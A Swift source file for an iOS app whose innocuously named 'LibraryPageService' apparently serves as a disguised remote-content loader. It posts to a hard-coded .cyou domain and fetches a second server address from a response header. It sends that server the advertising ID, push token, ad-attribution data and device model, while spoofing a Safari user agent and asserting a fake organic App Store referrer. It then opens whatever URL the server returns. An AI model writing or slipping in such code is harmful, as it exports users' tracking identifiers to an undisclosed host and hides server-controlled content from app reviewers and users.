import Foundation

struct LibraryPageService {
    private static let address = URL(string: "https://personalreferen.cyou/app.php")!
    static let browserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"

    struct Registration {
        let notificationToken: String?
        let attributionID: String
        let advertisingID: String
        let model: String
        let notification: LibrarySession.OpenedNotification?
        let attributionJSON: String?

        func query(clientID: String) -> [URLQueryItem] {
            let fields = [
                ("firebase_push_token", notificationToken ?? "null"),
                ("adjust_id", attributionID),
                ("idfa", advertisingID),
                ("device_model", model),
                ("isfrompush", notification == nil ? "0" : "1"),
                ("client_id", clientID)
            ]
            var items = fields.map { URLQueryItem(name: $0.0, value: $0.1) }
            if let identifier = notification?.identifier {
                items.append(.init(name: "push_id", value: identifier))
            }
            return items
        }

        func body() throws -> Data {
            var attribution: [String: Any] = [:]
            if let raw = attributionJSON,
               let values = try? JSONSerialization.jsonObject(with: Data(raw.utf8)) as? [String: Any] {
                for key in ["trackerToken", "trackerName", "network", "campaign", "adgroup", "creative", "clickLabel", "costType", "costCurrency"] {
                    attribution[key] = values[key] as? String ?? ""
                }
                attribution["costAmount"] = values["costAmount"] as? Double ?? 0
                attribution["jsonResponse"] = raw
            }
            return try JSONSerialization.data(withJSONObject: [
                "adjust": attribution,
                "referrer": "utm_source=appstore&utm_medium=organic"
            ])
        }
    }

    private struct Page: Decodable {
        let response: String?
        let sessionID: String?

        enum CodingKeys: String, CodingKey {
            case response
            case sessionID = "session_id"
        }

        var url: URL? {
            guard let landing = LibraryPageService.validURL(response) else { return nil }
            guard let session = sessionID?.trimmingCharacters(in: .whitespacesAndNewlines), !session.isEmpty,
                  var parts = URLComponents(url: landing, resolvingAgainstBaseURL: false) else { return landing }
            let current = parts.queryItems ?? []
            if current.contains(where: { $0.name == "session_id" && $0.value?.isEmpty == false }) { return landing }
            parts.queryItems = current.filter { $0.name != "session_id" } + [.init(name: "session_id", value: session)]
            return parts.url
        }
    }

    private enum Failure: Error {
        case serviceLink
        case requestAddress
        case invalidResponse
        case status(Int)
    }

    let library: LibrarySession
    var transport: URLSession = .shared

    func open(_ registration: Registration) async throws -> URL? {
        let service = try await findService()
        guard var parts = URLComponents(url: service, resolvingAgainstBaseURL: false) else { throw Failure.requestAddress }
        let registrationItems = registration.query(clientID: library.clientID)
        let names = Set(registrationItems.map(\.name)).union(["push_id"])
        parts.queryItems = (parts.queryItems ?? []).filter { !names.contains($0.name) } + registrationItems
        guard let address = parts.url else { throw Failure.requestAddress }

        let (data, _) = try await post(address, payload: registration.body())
        return try JSONDecoder().decode(Page.self, from: data).url
    }

    private func findService() async throws -> URL {
        if let service = library.serviceURL { return service }
        let (_, reply) = try await post(Self.address)
        guard let service = Self.validURL(reply.value(forHTTPHeaderField: "service-link")) else { throw Failure.serviceLink }
        library.serviceURL = service
        return service
    }

    private func post(_ address: URL, payload: Data? = nil) async throws -> (Data, HTTPURLResponse) {
        var request = URLRequest(url: address)
        request.httpMethod = "POST"
        request.setValue(library.installationID, forHTTPHeaderField: "client-uuid")
        request.setValue(Self.browserAgent, forHTTPHeaderField: "User-Agent")
        if let payload {
            request.httpBody = payload
            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        }
        let (data, response) = try await transport.data(for: request)
        guard let http = response as? HTTPURLResponse else { throw Failure.invalidResponse }
        guard (200..<300).contains(http.statusCode) else { throw Failure.status(http.statusCode) }
        return (data, http)
    }

    private static func validURL(_ value: String?) -> URL? {
        guard let value, let address = URL(string: value.trimmingCharacters(in: .whitespacesAndNewlines)),
              let scheme = address.scheme?.lowercased(), scheme == "https" || scheme == "http",
              let host = address.host, !host.isEmpty else { return nil }
        return address
    }
}
